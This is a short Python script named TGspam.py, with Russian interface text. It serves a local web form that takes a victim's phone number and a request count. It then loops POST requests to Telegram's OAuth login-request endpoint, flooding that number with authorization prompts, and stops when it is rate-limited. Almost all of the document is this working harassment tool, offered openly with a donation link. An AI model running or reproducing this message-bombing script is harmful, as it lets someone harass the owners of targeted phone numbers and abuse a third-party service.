"""
                    ✨ TGspam.py ✨

                    📦 Почта для обратной связи: mfua.crack@gmail.com
                    🎃 Лицензия: MIT license
                    ☕ Поддержать Автора: https://www.donationalerts.com/r/tot_camyi_coder
                    Код: https://github.com/tot-camiy-coder/TGspam.py
"""

# # # #
from pywebio import *
from pywebio.input import *
from pywebio.output import *
from pywebio.session import *
import requests as req
import pyfiglet
# # # #

url = "https://oauth.telegram.org/auth/request?bot_id=547043436&origin=https://core.telegram.org&embed=1&request_access=write"

async def telegram_message(phone: str):
    try:
        r = req.post(url, data=f"phone={phone}")
        if r.text == 'true':
            toast(f"{phone} - Отправлено!", color='success', duration=1)
            return True
        elif "too" in r.text:
            toast(f"{phone} - Слишком много запросов!", color='error', duration=10)
            return False
        else:
            toast(f"{phone} => {r.text}", color='error', duration=0)
            return False
    except Exception as err:
        toast(f"{phone} => {err}")
        return False

async def main():
    put_image("https://web.telegram.org/k/assets/img/android-chrome-144x144.png")
    put_markdown("## Telegram Spam (SampleBot только)")
    put_link("Исходный код", "https://github.com/tot-camiy-coder/TGspam.py", new_window=True)
    while True:
        data = await input_group("", {
            input("Введите номер телефона: ", required=True, type="text", name="phone"),
            input("Введите кол. запросов: ", required=True, type="number", name="amount")
        })
        
        for i in range(data['amount']):
            result = await telegram_message(data['phone'])
            if result == False: break


# __start__
if __name__ == "__main__":
    print('# '*30)
    print(pyfiglet.figlet_format("TGspam.py"))
    print('# '*30)
    start_server(main, debug=True, cdn=False, port=8080, host="127.0.0.1")
